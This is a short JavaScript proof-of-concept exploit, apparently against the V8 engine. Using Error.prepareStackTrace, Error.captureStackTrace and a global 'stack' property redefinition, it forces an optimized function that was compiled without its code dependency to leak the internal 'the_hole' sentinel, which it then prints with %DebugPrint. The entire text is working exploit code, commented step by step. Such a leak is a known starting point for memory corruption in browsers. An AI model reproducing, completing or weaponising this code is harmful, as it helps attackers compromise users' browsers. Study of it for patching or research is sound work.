function f() { return stack; }

Error.prepareStackTrace = () => {
    // delete accessor stack and redefine as normal property
    delete stack;
    Object.defineProperty(globalThis, "stack", { value: 1, writable: true }); // configurable is false (default)
    stack = {}; // cell_type == kMutable

    for (let i = 0; i < 0x10000; i++) { f(); } // compile via turbofan => code dependency is not installed
}

Error.captureStackTrace(globalThis);
Object.defineProperty(globalThis, "stack", { value: 1, configurable: true });

delete stack;
let the_hole = f(); // not deoptimized => leak the_hole

% DebugPrint(the_hole);